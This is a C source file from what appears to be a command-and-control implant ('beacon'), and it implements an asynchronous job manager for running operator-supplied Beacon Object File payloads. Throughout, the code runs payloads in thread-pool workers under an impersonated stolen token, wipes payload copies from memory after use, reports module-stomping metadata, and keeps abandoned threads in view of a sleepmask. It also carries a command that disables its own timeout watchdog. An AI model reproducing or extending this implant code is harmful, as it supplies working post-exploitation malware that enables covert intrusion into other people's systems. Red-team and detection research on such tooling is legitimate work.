/* beacon/src/Commands/Jobs.c
 * Async BOF job manager - create, start, process, kill, list. */

#include "Nax.h"
#include "Common.h"
#include "Bof.h"
#include "Jobs.h"

/* ========= [ helpers ] ========= */

static VOID JobFreeMedia( PNAX_INSTANCE Nax, NAX_BOF_MEDIA* head ) {
    while ( head ) {
        NAX_BOF_MEDIA* next = head->Next;
        if ( head->Data ) Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, head->Data );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, head );
        head = next;
    }
}

static NAX_BOF_MEDIA* JobReverseMedia( NAX_BOF_MEDIA* head ) {
    NAX_BOF_MEDIA* prev = NULL;
    while ( head ) {
        NAX_BOF_MEDIA* next = head->Next;
        head->Next = prev;
        prev = head;
        head = next;
    }
    return prev;
}

static UINT32 JobPackOutput( PNAX_INSTANCE Nax, NAX_BOF_CTX* ctx, PBYTE out, UINT32 out_cap, BOOL includeStompHdr ) {
    UINT32 off = 0;
    BOOL has_text  = ( ctx->Len > 0 );
    BOOL has_media = ( ctx->MediaHead != NULL );

    /* Prepend 2-byte stomp metadata on final drain */
    if ( includeStompHdr && off + 2 <= out_cap ) {
        out[ off++ ] = ctx->Stomped;
        out[ off++ ] = ctx->StompSlot;
    }

    if ( has_media ) {
        ctx->MediaHead = JobReverseMedia( ctx->MediaHead );
        for ( NAX_BOF_MEDIA* m = ctx->MediaHead; m; m = m->Next ) {
            if ( off + m->Len <= out_cap ) {
                MmCopy( out + off, m->Data, m->Len );
                off += m->Len;
            }
        }
        JobFreeMedia( Nax, ctx->MediaHead );
        ctx->MediaHead = NULL;
    }

    if ( has_text && has_media ) {
        if ( off + 5u + ctx->Len <= out_cap ) {
            out[ off ] = 0x00;
            NaxW32( out + off + 1, ctx->Len );
            MmCopy( out + off + 5, ctx->Buf, ctx->Len );
            off += 5u + ctx->Len;
        }
    } else if ( has_text ) {
        UINT32 copy = ( ctx->Len < out_cap - off ) ? ctx->Len : out_cap - off;
        MmCopy( out + off, ctx->Buf, copy );
        off += copy;
    }
    ctx->Len = 0;
    return off;
}

/* ========= [ create ] ========= */

FUNC NAX_JOB* NaxJobCreate( PNAX_INSTANCE Nax, UINT32 taskId,
                             PBYTE coffBuf, UINT32 coffSize,
                             PBYTE argsBuf, UINT32 argsSize,
                             DWORD timeoutMs ) {
    NAX_JOB* job = (NAX_JOB*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_JOB ) );
    if ( !job ) return NULL;
    MmZero( job, sizeof( NAX_JOB ) );

    job->Nax       = Nax;
    job->TaskId    = taskId;
    job->State     = NAX_JOB_PENDING;
    job->TimeoutMs = timeoutMs ? timeoutMs : JOB_DEFAULT_TIMEOUT_MS;

    job->CoffCopy = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, coffSize );
    if ( !job->CoffCopy ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job ); return NULL; }
    MmCopy( job->CoffCopy, coffBuf, coffSize );
    job->CoffSize = coffSize;

    if ( argsSize > 0 && argsBuf ) {
        job->ArgsCopy = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, argsSize );
        if ( !job->ArgsCopy ) {
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->CoffCopy );
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job );
            return NULL;
        }
        MmCopy( job->ArgsCopy, argsBuf, argsSize );
        job->ArgsSize = argsSize;
    }

    job->BofCtx.Buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, BOF_OUTPUT_CAP );
    if ( !job->BofCtx.Buf ) {
        if ( job->ArgsCopy ) Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->ArgsCopy );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->CoffCopy );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job );
        return NULL;
    }
    job->BofCtx.Len = 0;
    job->BofCtx.Cap = BOF_OUTPUT_CAP;

    Nax->Ntdll.RtlInitializeCriticalSection( &job->Lock );
    job->hStopEvent = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );

    job->Next    = Nax->JobHead;
    Nax->JobHead = job;

    return job;
}

/* ========= [ thread proc ] ========= */

static VOID CALLBACK NaxJobThreadProc( PTP_CALLBACK_INSTANCE Inst, PVOID Context, PTP_WORK Work ) {
    (void)Inst; (void)Work;
    NAX_JOB* job = (NAX_JOB*)Context;

    /* propagate NAX_INSTANCE to this thread's TEB so G_INSTANCE works */
    PNAX_INSTANCE Nax = job->Nax;
    NaxCurrentTeb()->NtTib.ArbitraryUserPointer = (PVOID)Nax;

    job->ThreadId = (DWORD)(ULONG_PTR)NaxCurrentTeb()->ClientId.UniqueThread;

    Nax->Kernel32.DuplicateHandle( Nax->Kernel32.GetCurrentProcess(), Nax->Kernel32.GetCurrentThread(),
                                   Nax->Kernel32.GetCurrentProcess(), &job->hThread, 0, FALSE, DUPLICATE_SAME_ACCESS );

    if ( Nax->ActiveToken && Nax->Advapi32.ImpersonateLoggedOnUser )
        Nax->Advapi32.ImpersonateLoggedOnUser( Nax->ActiveToken );

    NaxBofExecute( Nax, job->CoffCopy, job->CoffSize, job->ArgsCopy, job->ArgsSize );

    if ( Nax->Advapi32.RevertToSelf )
        Nax->Advapi32.RevertToSelf();

    /* watchdog may have abandoned us - clean up our copies, signal done, return to pool */
    if ( job->Abandoned ) {
        MmZero( job->CoffCopy, job->CoffSize );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->CoffCopy );
        job->CoffCopy = NULL;
        if ( job->ArgsCopy ) {
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->ArgsCopy );
            job->ArgsCopy = NULL;
        }
        job->Abandoned = 2;
        return;
    }

    /* zero+free COFF copy */
    MmZero( job->CoffCopy, job->CoffSize );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->CoffCopy );
    job->CoffCopy = NULL;
    if ( job->ArgsCopy ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->ArgsCopy );
        job->ArgsCopy = NULL;
    }

    job->State = NAX_JOB_FINISHED;

    Nax->Kernel32.SetEvent( Nax->JobWakeEvent );
}

/* ========= [ start ] ========= */

FUNC INT NaxJobStart( PNAX_INSTANCE Nax, NAX_JOB* job ) {
    PTP_WORK work = NULL;
    NTSTATUS st = Nax->Ntdll.TpAllocWork( &work, (PTP_WORK_CALLBACK)NaxJobThreadProc, job, NULL );
    if ( !NT_SUCCESS( st ) || !work ) {
        NaxDbg( Nax, "[job] TpAllocWork failed: 0x%08x", st );
        return NAX_ERR_FAIL;
    }

    job->State     = NAX_JOB_RUNNING;
    job->StartTick = Nax->Kernel32.GetTickCount64();
    Nax->Ntdll.TpPostWork( work );
    Nax->Ntdll.TpReleaseWork( work );

    NaxDbg( Nax, "[job] started taskId=0x%08x timeout=%ums", job->TaskId, job->TimeoutMs );
    return NAX_OK;
}

/* ========= [ kill ] ========= */

FUNC INT NaxJobKill( PNAX_INSTANCE Nax, UINT32 taskId ) {
    NAX_JOB* job = Nax->JobHead;
    while ( job ) {
        if ( job->TaskId == taskId && ( job->State == NAX_JOB_RUNNING || job->State == NAX_JOB_PENDING ) )
            break;
        job = job->Next;
    }
    if ( !job ) return NAX_ERR_INVAL;

    Nax->Kernel32.SetEvent( job->hStopEvent );

    if ( job->hThread ) {
        DWORD w = Nax->Kernel32.WaitForSingleObject( job->hThread, JOB_GRACE_PERIOD_MS );
        if ( w != WAIT_OBJECT_0 ) {
            /* Thread is stuck. TerminateThread on a pool worker corrupts ntdll's
             * thread pool and crashes the process - abandon the thread instead.
             * The leaked resources are a few KB; a dead beacon is worse. */
            job->Abandoned = TRUE;

            NaxDbg( Nax, "[job] abandoned taskId=0x%08x (thread still alive)", taskId );
        }
    }

    job->State = NAX_JOB_KILLED;
    Nax->Kernel32.SetEvent( Nax->JobWakeEvent );
    return NAX_OK;
}

/* ========= [ process - heartbeat drain ] ========= */

FUNC UINT32 NaxProcessJobs( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
    UINT32 written = 0;
    NAX_JOB** pp = &Nax->JobHead;

    Nax->Kernel32.ResetEvent( Nax->JobWakeEvent );

    while ( *pp ) {
        NAX_JOB* job = *pp;

        /* ---- abandoned: thread still alive after kill, kept in list for NaxFindCurrentJob ---- */
        if ( job->State == NAX_JOB_ABANDONED ) {
            if ( job->Abandoned >= 2 ) {
                NaxDbg( Nax, "[job] abandoned thread done taskId=0x%08x", job->TaskId );
                *pp = job->Next;
                if ( job->BofCtx.Buf ) Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->BofCtx.Buf );
                JobFreeMedia( Nax, job->BofCtx.MediaHead );
                if ( job->hThread ) Nax->Kernel32.CloseHandle( job->hThread );
                if ( job->hStopEvent ) Nax->Ntdll.NtClose( job->hStopEvent );
                Nax->Ntdll.RtlDeleteCriticalSection( &job->Lock );
                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job );
            } else {
                pp = &job->Next;
            }
            continue;
        }

        /* ---- watchdog check ---- */
        if ( job->State == NAX_JOB_RUNNING && !Nax->WatchdogDisabled ) {
            UINT64 elapsed = Nax->Kernel32.GetTickCount64() - job->StartTick;
            if ( elapsed > (UINT64)job->TimeoutMs ) {
                NaxDbg( Nax, "[job] watchdog timeout taskId=0x%08x (%ums)", job->TaskId, (UINT32)elapsed );
                NaxJobKill( Nax, job->TaskId );
            }
        }

        /* ---- drain output ---- */
        if ( job->State == NAX_JOB_RUNNING ) {
            if ( Nax->Ntdll.RtlTryEnterCriticalSection( &job->Lock ) ) {
                if ( job->BofCtx.Len > 0 || job->BofCtx.MediaHead ) {
                    UINT32 hdr_off  = written;
                    UINT32 data_off = written + 9;
                    if ( data_off < out_cap ) {
                        UINT32 data_len = JobPackOutput( Nax, &job->BofCtx, out + data_off, out_cap - data_off, FALSE );
                        if ( data_len > 0 ) {
                            out[ hdr_off ] = NAX_JOB_OUTPUT;
                            NaxW32( out + hdr_off + 1, job->TaskId );
                            NaxW32( out + hdr_off + 5, data_len );
                            written += 9 + data_len;
                        }
                    }
                }
                Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
            }
            pp = &job->Next;
            continue;
        }

        /* ---- finished or killed - final drain + cleanup ---- */
        BYTE jobType = ( job->State == NAX_JOB_KILLED ) ? NAX_JOB_KILLED : NAX_JOB_COMPLETE;

        Nax->Ntdll.RtlEnterCriticalSection( &job->Lock );
        UINT32 hdr_off  = written;
        UINT32 data_off = written + 9;
        UINT32 data_len = 0;
        if ( data_off < out_cap )
            data_len = JobPackOutput( Nax, &job->BofCtx, out + data_off, out_cap - data_off, TRUE );
        Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );

        out[ hdr_off ] = jobType;
        NaxW32( out + hdr_off + 1, job->TaskId );
        NaxW32( out + hdr_off + 5, data_len );
        written += 9 + data_len;

        if ( job->Abandoned ) {
            /* thread still alive - keep in list so NaxFindCurrentJob + sleepmask see it */
            job->State = NAX_JOB_ABANDONED;
            NaxDbg( Nax, "[job] abandoned taskId=0x%08x (kept in list)", job->TaskId );
            pp = &job->Next;
        } else {
            /* unlink + free */
            *pp = job->Next;
            if ( job->BofCtx.Buf ) Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->BofCtx.Buf );
            JobFreeMedia( Nax, job->BofCtx.MediaHead );
            if ( job->CoffCopy ) {
                MmZero( job->CoffCopy, job->CoffSize );
                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->CoffCopy );
            }
            if ( job->ArgsCopy ) Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->ArgsCopy );
            if ( job->hThread ) Nax->Kernel32.CloseHandle( job->hThread );
            if ( job->hStopEvent ) Nax->Ntdll.NtClose( job->hStopEvent );
            Nax->Ntdll.RtlDeleteCriticalSection( &job->Lock );
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job );
        }
    }

    return written;
}

/* ========= [ list ] ========= */

FUNC INT NaxJobList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
    UINT32 count = 0;
    PBYTE  p     = out + 4;
    UINT32 cap   = *out_len - 4;

    NAX_JOB* job = Nax->JobHead;
    while ( job && count * 9 < cap ) {
        NaxW32( p, job->TaskId );   p += 4;
        *p++ = (BYTE)job->State;
        UINT32 elapsed = (UINT32)( ( Nax->Kernel32.GetTickCount64() - job->StartTick ) / 1000u );
        NaxW32( p, elapsed );       p += 4;
        count++;
        job = job->Next;
    }

    NaxW32( out, count );
    *out_len = 4 + count * 9;
    return NAX_OK;
}

/* ========= [ watchdog set ] ========= */

FUNC INT NaxCmdWatchdogSet( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 1 || args == NULL )
        return NAX_ERR_INVAL;

    BYTE enable = args[0] ? 1 : 0;
    Nax->WatchdogDisabled = !enable;

    if ( *out_len >= 1 ) {
        out[0]   = enable;
        *out_len = 1;
    } else {
        *out_len = 0;
    }

    NaxDbg( Nax, "[watchdog] %s", enable ? "enabled" : "disabled" );
    return NAX_OK;
}
